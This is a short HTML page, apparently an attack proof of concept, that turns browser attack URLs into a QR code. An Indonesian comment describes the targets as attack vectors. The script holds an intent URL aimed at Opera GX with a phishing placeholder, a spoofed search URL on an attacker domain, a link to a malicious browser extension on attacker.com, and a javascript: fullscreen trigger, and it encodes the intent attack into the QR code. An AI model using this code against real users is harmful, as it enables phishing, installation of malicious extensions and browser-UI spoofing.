<!DOCTYPE html>
<html>
<head>
    <title>QR Code Generator</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode.js/1.0.0/qrcode.min.js"></script>
</head>
<body>
    <div id="qrcode"></div>
    <script>
        // Generate QR code untuk berbagai attack vectors
        const attacks = {
            intent: "intent://vtp.operagx.gg/?url=data://google.com/,<phishing>#Intent;...",
            search: "https://www.google.attacker.com/search?q=target.com&client=opera",
            extension: "https://attacker.com/malicious.crx",
            fullscreen: "javascript:document.documentElement.requestFullscreen()"
        };

        const selectedAttack = attacks.intent; // Rotate based on context
        QRCode.toCanvas(document.getElementById('qrcode'), selectedAttack);
    </script>
</body>
</html>
